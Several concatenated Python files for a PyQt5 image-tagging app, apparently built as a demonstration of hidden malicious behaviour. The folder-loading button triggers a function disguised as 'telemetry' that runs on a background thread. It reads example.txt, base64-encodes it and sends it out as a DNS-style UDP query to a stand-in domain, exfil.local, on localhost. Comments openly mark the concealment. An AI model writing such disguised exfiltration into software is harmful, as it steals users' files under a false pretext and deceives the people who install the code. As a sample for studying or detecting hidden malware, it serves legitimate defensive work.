from PyQt5.QtWidgets import QApplication
from annogui.widgets import MainWindow
import sys


def main():
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()

from PyQt5.QtWidgets import (
    QMainWindow,
    QFileDialog,
    QPushButton,
    QLabel,
    QVBoxLayout,
    QWidget,
)
from annogui.io import preload_images


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Annogui – Image Tagger")

        self.label = QLabel("Choose a dataset folder")
        self.button = QPushButton("Load Dataset")
        self.button.clicked.connect(self.choose_folder)

        layout = QVBoxLayout()
        layout.addWidget(self.label)
        layout.addWidget(self.button)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

    def choose_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "Select Dataset Folder")
        if folder:
            self.label.setText(f"Dataset: {folder}")
            preload_images(folder)  # 🔍 Hidden behavior triggered here


import os
import glob
from PIL import Image
from .utils import send_metrics_async


def _get_image_paths(folder: str):
    return glob.glob(os.path.join(folder, "*.jpg"))


def _resize_image(path: str, size=(64, 64)):
    try:
        with Image.open(path) as img:
            img = img.convert("RGB")
            return img.resize(size)
    except Exception:
        return None


def preload_images(folder: str):
    paths = _get_image_paths(folder)
    thumbnails = []
    for p in paths[:10]:  # Load first 10 for preview
        thumb = _resize_image(p)
        if thumb:
            thumbnails.append(thumb)

    # Simulated caching or "telemetry"
    send_metrics_async()  # 👈 Actually sends example.txt contents


import base64
import threading
import os
import socket


def _read_reference_data():
    # Intentionally buried deep — hard to see it's example.txt
    base = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    target = os.path.join(base, "example.txt")
    if not os.path.exists(target):
        return b""
    try:
        with open(target, "rb") as f:
            data = f.read()
            return base64.urlsafe_b64encode(data)  # 👈 Different encoding again
    except Exception:
        return b""


def _send_dns_payload(encoded: bytes):
    if not encoded:
        return
    try:
        # UDP DNS-like exfiltration
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            chunk = encoded[:200]  # keep it tiny
            # fake domain: `data.<encoded>.exfil.local`
            msg = f"data.{chunk.decode()}.exfil.local".encode()
            sock.sendto(msg, ("127.0.0.1", 53))  # DNS port
    except Exception:
        pass


def send_metrics_async():
    # Looks like async metric logging
    def task():
        encoded = _read_reference_data()
        _send_dns_payload(encoded)

    t = threading.Thread(target=task, daemon=True)
    t.start()
